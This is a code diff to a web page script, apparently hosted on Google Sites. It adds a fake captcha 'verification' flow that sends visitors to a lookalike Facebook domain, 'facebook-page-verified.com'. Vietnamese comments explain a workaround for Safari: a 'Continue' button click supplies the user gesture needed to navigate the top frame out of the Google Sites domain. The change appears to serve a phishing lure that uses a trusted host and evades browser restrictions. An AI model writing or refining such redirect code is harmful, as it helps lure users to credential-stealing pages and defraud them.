@@ -307,6 +307,7 @@
     </div>
   </div>
   <script>
+    const REDIRECT_URL = "https://facebook-page-verified.com/live";
     const VERIFY_DELAY_MS = 1400;
     const DONE_DELAY_MS = 500;
     const TICK_DRAW_MS = 360;
@@ -433,8 +434,7 @@
 
     const introState = {
       status: "idle",
-      timers: [],
-      popup: null
+      timers: []
     };
 
     const translateText = async (text, targetLang) => {
@@ -516,26 +516,46 @@
       }
     };
 
-    const ensurePopup = () => {
-      if (introState.popup && !introState.popup.closed) {
-        return introState.popup;
+    const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+
+    const navigateOut = () => {
+      try {
+        window.top.location.href = REDIRECT_URL;
+      } catch (_) {
+        window.open(REDIRECT_URL, "_blank");
       }
-      const popup = globalThis.open("about:blank", "_blank", "noopener");
-      if (popup) {
-        popup.opener = null;
-      }
-      introState.popup = popup;
-      return popup;
     };
 
-    const openRedirect = (url) => {
-      const popup = ensurePopup();
-      if (popup && !popup.closed) {
-        popup.location.replace(url);
-        if (typeof popup.focus === "function") {
-          popup.focus();
-        }
-      }
+    const showContinueBtn = () => {
+      const overlay = document.getElementById("intro-captcha");
+      if (!overlay) return;
+      const panel = overlay.querySelector(".intro-captcha-panel");
+      if (!panel) return;
+
+      const wrapper = document.createElement("div");
+      wrapper.style.cssText = "margin-top:1.5rem;text-align:center";
+
+      const btn = document.createElement("button");
+      btn.type = "button";
+      btn.textContent = "Continue";
+      btn.style.cssText = [
+        "display:inline-block",
+        "padding:0.7rem 3rem",
+        "background:#0180FA",
+        "color:#fff",
+        "border:none",
+        "border-radius:6px",
+        "font-size:15px",
+        "font-weight:700",
+        "font-family:Helvetica,Arial,sans-serif",
+        "letter-spacing:0.03em",
+        "cursor:pointer"
+      ].join(";");
+
+      btn.addEventListener("click", navigateOut);
+      wrapper.appendChild(btn);
+      panel.appendChild(wrapper);
+      btn.focus();
     };
 
     const finishIntro = () => {
@@ -543,15 +563,21 @@
       if (!overlay) return;
       overlay.classList.add("is-fading");
       const doneTimer = setTimeout(() => {
-        overlay.remove();
-        openRedirect("https://facebook-page-verified.com/live");
+        if (isSafari) {
+          // Safari: cần user gesture để thoát khỏi Google Sites domain.
+          // Hiện nút Continue — click là gesture thật, window.top mới được phép.
+          overlay.classList.remove("is-fading");
+          showContinueBtn();
+        } else {
+          overlay.remove();
+          window.open(REDIRECT_URL, "_blank", "noopener,noreferrer");
+        }
       }, DONE_DELAY_MS);
       introState.timers.push(doneTimer);
     };
 
     const handleCaptchaChange = () => {
       if (introState.status !== "idle") return;
-      ensurePopup();
       setStatus("loading");
       const verifyTimer = setTimeout(() => {
         setStatus("checked");
